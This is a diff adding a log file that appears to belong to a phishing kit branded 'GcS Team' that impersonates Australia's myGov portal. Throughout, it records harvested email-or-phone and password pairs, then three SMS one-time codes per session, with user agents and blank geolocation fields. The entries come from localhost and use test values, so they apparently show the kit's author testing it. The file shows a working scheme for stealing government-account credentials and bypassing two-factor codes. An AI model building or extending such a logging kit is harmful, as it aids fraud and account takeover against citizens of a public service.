@@ -1,0 +1,112 @@
+::1  -  2022-12-29 @ 08:03:42
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|Email or Phone      : test123@test.com
+|Password        : test1234again
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:05:47
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 1      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+::1
+Country : 
+City: 
+Region : 
+State: 
+Zip : 
+country code: 
+lat: 
+lon: 
+timezone: 
+isp: 
+as: 
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:05:56
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 2      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+::1
+Country : 
+City: 
+Region : 
+State: 
+Zip : 
+country code: 
+lat: 
+lon: 
+timezone: 
+isp: 
+as: 
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:09:04
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 3      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:10:19
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 3      : 12345
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:11:41
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|Email or Phone      : newtest@newtester.com
+|Password        : newtester
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:15:25
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|Email or Phone      : newtester3@tester3.com
+|Password        : tster23
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:20:37
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 1      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:20:41
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 2      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:20:45
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 3      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:22:26
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|Email or Phone      : testfourfour@four.com
+|Password        : fourfourty
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:23:51
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 1      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:23:55
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 2      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:23:59
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+|SMS 3      : 1234
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
